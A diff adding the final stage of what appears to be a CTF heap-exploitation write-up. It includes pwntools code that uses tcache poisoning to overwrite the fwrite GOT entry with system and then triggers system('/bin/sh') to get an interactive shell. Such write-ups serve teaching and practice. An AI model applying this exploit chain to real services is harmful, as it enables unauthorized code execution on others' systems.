@@ -824,6 +824,80 @@ As a result, it's possible to create chunks that say `/bin/sh\x00` such that
 calling some `fwrite` to write out the buffer will instead call
 `system("/bin/sh\x00")`, giving our shell :>
 
+For this, multiple chunks need to be allocated again. As before, an out-of-band
+packet can be sent to achieve this.
+
+```py
+    r.info("performing GOT overwrite")
+    fds[1] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    fds[1].connect((HOST, poll_port))
+
+    for i in range(3):
+        fds[i+2] = remote(HOST, poll_port)
+        sleep(1)
+
+    fds[1].send(b'\0', socket.MSG_OOB)
+```
+
+In my circumstance, there are 3 entries in the `0x50` `tcachebin`, as such, 3
+connections are required
+
+On the third chunk, when allocated, the GOT entry for `fwrite` can be
+overwritten to point to `system`
+
+```py
+    ## this is the one we want :>
+    alloc(fds[4], 0x39, p64(libc.sym["system"]))
+    fds[4].close()
+    sleep(1)
+```
+
+It is important to note, however, that chunk metadata has been destroyed when
+setting up the tcache poison. As a result, these chunks cannot be freed without
+the program crashing. The benefit here is, however, that `fwrite` is called
+prior to the chunk being freed. As a result, before any chunk is freed, it would
+be ideal to actually call `system("/bin/sh\x00")`. Therefore, the first two
+chunks can be allocated with the text `"/bin/sh\x00`, such that the call we want
+occurs before the binary crashes.
+
+In all:
+
+```py
+    r.info("performing GOT overwrite")
+    fds[1] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    fds[1].connect((HOST, poll_port))
+
+    for i in range(3):
+        fds[i+2] = remote(HOST, poll_port)
+        sleep(1)
+
+    fds[1].send(b'\0', socket.MSG_OOB)
+
+    for i in range(2):
+        ## these will be printed first before being freed. since the 0x20 chunk
+        ## has been completely destroyed from the previous payload write, we can
+        ## no longer free the socket hanging the process
+        alloc(fds[i+2], 0x40, b"/bin/sh")
+        fds[i+2].close()
+        sleep(1)
+
+
+    ## this is the one we want :>
+    alloc(fds[4], 0x39, p64(libc.sym["system"]))
+    fds[4].close()
+    sleep(1)
+
+    fds[1].send(b'\0')
+    fds[1].close()
+    sleep(1)
+
+    r.recvline()
+
+    r.success("enjoy your shell")
+
+    r.interactive()
+```
+
 tada 🎉
 
 ```sh
